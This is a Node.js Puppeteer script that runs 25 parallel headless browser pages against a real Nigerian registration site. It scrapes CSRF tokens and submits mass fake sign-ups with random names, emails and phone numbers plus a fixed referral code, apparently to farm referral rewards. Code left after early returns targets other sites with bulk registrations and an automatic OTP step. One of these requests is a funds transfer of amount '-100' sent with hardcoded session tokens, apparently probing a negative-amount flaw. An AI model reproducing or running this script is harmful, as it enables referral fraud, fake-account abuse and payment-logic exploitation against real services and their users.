import puppeteer from "puppeteer";

const BROWSERS = 5;
const PAGES = 5;

let count = 0;
async function runBrowser(id) {
  const browser = await puppeteer.launch({
    headless: true,
    args: [
      "--ignore-certificate-errors",
      "--no-sandbox",
      "--disable-setuid-sandbox"
    ]
  });
  const endpoint = "https://smshikasub.com.ng/register"


  async function runPage(i) {
    const page = await browser.newPage();
  
  
    await page.goto(endpoint);

    const csrfTokenInput = await page.$('input[name="_token"]');
    const csrfToken = await page.evaluate(input => input.value, csrfTokenInput);
    count+=1
    console.log('CSRF Token (from input):', csrfToken, ` :${count}`);
    // return  
  
  
    await page.evaluate((token) => {
      let running = true;
      
      const THREADS = 1;
      const BATCHES = 1;
  
      const firstNames = [
        "James","Mary","John","Patricia","Robert","Jennifer","Michael","Linda","William","Elizabeth",
        "David","Barbara","Richard","Susan","Joseph","Jessica","Thomas","Sarah","Charles","Karen",
        "Christopher","Nancy","Daniel","Lisa","Matthew","Betty","Anthony","Margaret","Mark","Sandra",
        "Donald","Ashley","Steven","Kimberly","Paul","Emily","Andrew","Donna","Joshua","Michelle",
        "Kenneth","Dorothy","Kevin","Carol","Brian","Amanda","George","Melissa","Edward","Deborah",
        "Ronald","Stephanie","Timothy","Rebecca","Jason","Laura","Jeffrey","Sharon","Ryan","Cynthia",
        "Jacob","Kathleen","Gary","Amy","Nicholas","Shirley","Eric","Angela","Jonathan","Helen",
        "Stephen","Anna","Larry","Brenda","Justin","Pamela","Scott","Nicole","Brandon","Emma",
        "Benjamin","Samantha","Samuel","Katherine","Frank","Christine","Gregory","Debra","Alexander","Rachel",
        "Raymond","Catherine","Patrick","Carolyn","Jack","Janet","Dennis","Ruth","Jerry","Maria",
        "Tyler","Heather","Aaron","Diane","Jose","Virginia","Adam","Julie","Nathan","Joyce",
        "Henry","Victoria","Douglas","Olivia","Zachary","Kelly","Peter","Christina","Kyle","Lauren"
      ];
      
      const lastNames = [
        "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
        "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin",
        "Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson",
        "Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores",
        "Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts",
        "Gomez","Phillips","Evans","Turner","Diaz","Parker","Cruz","Edwards","Collins","Reyes",
        "Stewart","Morris","Morales","Murphy","Cook","Rogers","Gutierrez","Ortiz","Morgan","Cooper",
        "Peterson","Bailey","Reed","Kelly","Howard","Ramos","Kim","Cox","Ward","Richardson",
        "Watson","Brooks","Chavez","Wood","James","Bennett","Gray","Mendoza","Ruiz","Hughes",
        "Price","Alvarez","Castillo","Sanders","Patel","Myers","Long","Ross","Foster","Jimenez",
        "Powell","Jenkins","Perry","Russell","Sullivan","Bell","Coleman","Butler","Henderson","Barnes"
      ];
      
      async function send(i) {
        if (!running) return;
      
        let gottenCaptcha;
      
        const randomNumber = (n, time) => {
          if (n == 1) return Math.floor(1 + Math.random() * 9)
          if (n == 2 && time) return Math.floor(10 + Math.random() * 60)
            else if (n !== 2 && !time) return Math.floor(10 + Math.random() * 99)
          if (n == 4) return Math.floor(1000 + Math.random() * 9999);
          Math.floor(10000 + Math.random() * 99999)
        };
      
        const generateFirstName = () => {
          const c = Math.floor(Math.random() * firstNames.length);
          const n = firstNames[c];
          return n;
        }
      
        const generateLastName = () => {
          const c = Math.floor(Math.random() * lastNames.length);
          const n = lastNames[c];
          return n;
        }
      
        const generateUsername = () => {
          const u = `${generateFirstName()}${generateLastName()}${randomNumber(Math.floor(Math.random() * 4))}`
          const un = u.toLowerCase();
          return un;
        }
      
        const generateEmail = () => {
          const chars = 'abcdefghijklmnopqrstuvwxyz';
          const ran = () => chars[Math.floor(Math.random() * chars.length)];
          const email = `${ran()}ao${ran()}${ran()}${ran()}${ran()}${Math.floor(randomNumber() / 1000)}%40gmail.com`;
          return email;
        }
      
        const generatePhoneNumber = () => {
          const random8 = () => Math.floor(10000001 + Math.random() * 89999998);
          const num = `70${random8()}`;
          return num;
        }
      
        function buildForm() {
          const fd = new FormData();
          fd.append("username", generateUsername());
          fd.append("phone", `70${randomNumber()}800`);
          fd.append("email", generateEmail());
          fd.append("password", "Gamby123");
          fd.append("confirm_password", "Gamby123");
          fd.append("referral_code", "d11da5b0");
          return fd;
        }
      
        const fd = buildForm();
      
        const getWithdrawalAmount = () => {
          let am = 10;
          const a = Math.floor(Math.random() * 20);
          if (a < 10) am = a + 10;
          else am = a
          return am;
        }
      
        const ref_code = 'OGpouwlwha';
        // AOsbceaelg
      
        const countries = ['Nigeria', 'Australia', 'Canada', 'Ghana', 'India', 'Kenya', 'Tanzania', 'Uganda', 'UK', 'USA'];
        // const country = countries[Math.floor(Math.random() * countries.length)];
        const country = 'Nigeria';
      
        const unix_timestamp = Math.floor(Date.now() / 1000);
      
        try {
          const generatedFirstName = generateFirstName();
          const generatedLastName = generateLastName();
          const bothNames = `${generatedFirstName}+${generatedLastName}`
          // const res = await fetch(endpoint, {
          //   method: "POST",
          //   agent,
          //   headers: {
          //     ...fd.getHeaders(),
          //     Cookie: 'PHPSESSID=r8kp1uq3smcuahd8vg0ll51qbr',
          //     Connection: "keep-alive"
          //   },
          //   body: fd
          // });
      
          let cookie;
      
          const ref_code = 'CE7BABE2';
      
          const r = await fetch("https://smshikasub.com.ng/register", {
            "headers": {
              "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
              "accept-language": "en-US,en;q=0.9",
              "cache-control": "max-age=0",
              "content-type": "application/x-www-form-urlencoded",
              "priority": "u=0, i",
              "sec-ch-ua": "\"Microsoft Edge\";v=\"147\", \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"147\"",
              "sec-ch-ua-mobile": "?0",
              "sec-ch-ua-platform": "\"Windows\"",
              "sec-fetch-dest": "document",
              "sec-fetch-mode": "navigate",
              "sec-fetch-site": "same-origin",
              "sec-fetch-user": "?1",
              "upgrade-insecure-requests": "1",
              "cookie": "XSRF-TOKEN=eyJpdiI6IkJBSUcrVWdEVEM3SlhseVBwZkNKUkE9PSIsInZhbHVlIjoicUlXb1JHdXJZemZJUU5OY3pLSXZoV2hjbkhLTkkxSEIrVk9qOGsrV0tpT2tMWWs0Y01nNXpINFc3eEpVeTM4am03K2x5NEE2WW5XVS8zWm4wdDZpZm5OaXRGQWVzYldXaThaQzVFODhaQ21yZE00cUlFeDRRa1FrWDgzUHEzbUQiLCJtYWMiOiI5Y2Y1MDYyOTBiNmIwMGFlYTNmYWNjY2EyMDlkMmI2YWIyOWQ0OTFjOWYxZGZkZThkZjNhNTRlNGVmOGU4ZGFmIiwidGFnIjoiIn0%3D; hk-vtu-plug-session=eyJpdiI6InBjWk9ybTFhWk5wRUZjVXRRcW5WUFE9PSIsInZhbHVlIjoiamVBTEJ3TGVHWHduVThNWTl4L3N6ZEVubDBRK0VvamlTc1N6b09uM3BsZ3hEUjdNSGhiakhtUWJQNmgrbTJnYnQ0QlhtNWR6M2prTkg0cERLcGR5U2lDU2lHYlNwZlJUYyszaXg3OW03aXIvVlEvNkw1SWg0b1E5NFFKTmxhL04iLCJtYWMiOiJkZTIzZTI1YTIyOWEzYjhlOWQ3NmUxOTYzMzE5YzJmZTNiNGVlNDVhMjI0NDg3MDRiODMwZmE2OWEwNmI5NzIwIiwidGFnIjoiIn0%3D",
              "Referer": `https://smshikasub.com.ng/register?ref=${ref_code}`
            },
            "body": `_token=${token}&first_name=${generatedFirstName}&last_name=${generatedLastName}&name=${bothNames}&phone=0${generatePhoneNumber()}&email=${generateEmail()}&password=Creeper123#&password_confirmation=Creeper123#&transaction_pin=1902&transaction_pin_confirmation=1902&referral_code=${ref_code}&terms=1`,
            "method": "POST"
          });
      
          // const result = await r?.json() || await r?.text() || 'No result'
          console.log(await r.text());
      
          return;
      
          const res = await fetch("https://bullbatch.com/register", {
            "headers": {
              "accept": "*/*",
              "accept-language": "en-US,en;q=0.9",
              "content-type": "application/json",
              "priority": "u=1, i",
              "sec-ch-ua": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\"",
              "sec-ch-ua-mobile": "?0",
              "sec-ch-ua-platform": "\"Windows\"",
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "Referer": `https://bullbatch.com/reg/${ref_code}`
            },
            "body": `{\"fName\":\"Alex\",\"lName\":\"${generateUsername()}\",\"email\":\"${generateEmail()}\",\"password\":\"Creeper${generateUsername()}\",\"country\":\"${country}\",\"currency_format\":\"en-NG\",\"currency\":\"NGN\",\"date\":\"Mar 30 at ${randomNumber(1)}:${randomNumber(2, true)} PM\",\"inviter\":\"OGpouwlwha\"}`,
            "method": "POST"
          });
          
          const givenCookie = res.headers.get("set-cookie");
          const signatureCookie = givenCookie.split(";")[0];
          cookie = signatureCookie;
          console.log(cookie);
      
          const nextRes = await fetch("https://bullbatch.com/verify_otp", {
            "headers": {
              "accept": "*/*",
              "accept-language": "en-US,en;q=0.9",
              "content-type": "application/json",
              "priority": "u=1, i",
              "sec-ch-ua": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\"",
              "sec-ch-ua-mobile": "?0",
              "sec-ch-ua-platform": "\"Windows\"",
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "cookie": cookie.toString(),
              "Referer": "https://bullbatch.com/reg/AOsbceaelg"
            },
            "body": "{\"otp\":\"auto\",\"screen\":\"1280wh720\"}",
            "method": "POST"
          });
      
          console.log(`Try ${i + 1} -> ${res.status}`);
          console.log(await res.json());
          console.log(await nextRes.json());
          return;
      
          const transferRes = await fetch("https://bullbatch.com/bullbatch_to_bullbatch", {
            "headers": {
              "accept": "*/*",
              "accept-language": "en-US,en;q=0.9",
              "content-type": "application/json",
              "priority": "u=1, i",
              "sec-ch-ua": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\"",
              "sec-ch-ua-mobile": "?0",
              "sec-ch-ua-platform": "\"Windows\"",
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "cookie": "signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY5Y2E3MTliMGQzNTNlZGEzNTc3OGRkZCIsImlhdCI6MTc3NDg3NTAzNSwiZXhwIjoxNzc0OTYxNDM1fQ.n7QrGhsiGo_7bf_lXpRkSyS_5g1-XyQX6csgC1mN5gQ; _signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY5Y2E3MTliMGQzNTNlZGEzNTc3OGRkZCIsImlhdCI6MTc3NDg3NTA5Nn0.Sey5x5_vMvyl9coTsDwg9SqRcm_RmzZP2o5tZN52NvI",
              "Referer": "https://bullbatch.com/bullbatch_to_bullbatch"
            },
            "body": "{\"amount\":\"-100\",\"date\":\"Mar 30 at 2:46 PM\",\"public_id\":\"OGpouwlwha\"}",
            "method": "POST"
          });
      
          const res2 = await fetch("https://beefarm.top/dashboard.php", {
            "headers": {
              "accept": "*/*",
              "accept-language": "en-US,en;q=0.9",
              "content-type": "multipart/form-data; boundary=----WebKitFormBoundarytqsuwwmWO23P4oAc",
              "priority": "u=1, i",
              "sec-ch-ua": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\"",
              "sec-ch-ua-mobile": "?0",
              "sec-ch-ua-platform": "\"Windows\"",
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "cookie": "g_state={\"i_l\":0,\"i_ll\":1774116252257,\"i_b\":\"T6NbVPzdBHIB/OUmWRr/TlRhIDXEnWLadsAYlmeGP7w\",\"i_e\":{\"enable_itp_optimization\":0}}; PHPSESSID=af09c4dd4a6eb1a3da49cbc57122f71a",
              "Referer": "https://beefarm.top/dashboard.php"
            },
            "body": "------WebKitFormBoundarytqsuwwmWO23P4oAc\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\ncheck_membership\r\n------WebKitFormBoundarytqsuwwmWO23P4oAc--\r\n",
            "method": "POST"
          });
      
          return;
      
      
        } catch (err) {
          console.log(`❌ ${i + 1}`, err.message);
        }
      }
      
      (async () => {
        if (!running) return;
        for (let b = 0; b < BATCHES; b++) {
          console.log(`🚀 Burst ${b + 1}`);
          if (!running) return;
          await Promise.all(
            Array.from({ length: THREADS }, (_, i) => send(b * THREADS + i))
          );
        }
        console.log("🎯 Done");
      })();
    }, csrfToken);
  }

  await Promise.all(
    Array.from({ length: PAGES }, (_, i) => runPage(i))
  );

  await new Promise(r => setTimeout(r, 40000));

  await browser.close();
}

await Promise.all(
  Array.from({ length: BROWSERS }, (_, i) => runBrowser(i))
);